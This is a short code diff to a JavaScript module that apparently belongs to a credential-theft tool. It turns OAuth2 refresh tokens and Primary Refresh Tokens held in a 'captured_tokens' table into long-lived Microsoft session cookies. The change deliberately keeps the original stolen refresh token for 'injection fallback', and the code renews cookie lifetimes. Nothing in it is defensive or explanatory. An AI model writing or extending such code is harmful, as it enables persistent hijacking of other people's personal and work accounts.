@@ -3,7 +3,7 @@
  * Converts OAuth2 refresh tokens/PRT to long-lasting session cookies
  * Supports both personal (MSA) and work/school (Azure AD) accounts
  * 
- * Enhanced with our proven techniques for
+ * Enhanced with competitor-proven techniques for
  reliable cookie generation */
 'use strict';
 
@@ -458,10 +458,14 @@ async function processCookieConversion(tokenId, accessToken, templateType, tenan
   const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType);
   if (result.success && result.cookies) {
     const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
+    // FIX: Preserve refresh_token_encrypted during cookie conversion
+    // Don't overwrite the refresh token column - it must stay intact for injection
     await db.query(
       'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
       [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
     );
+    // Note: refresh_token_encrypted is intentionally NOT updated here
+    // to preserve the original refresh token for injection fallback
   }
   return result;
 }
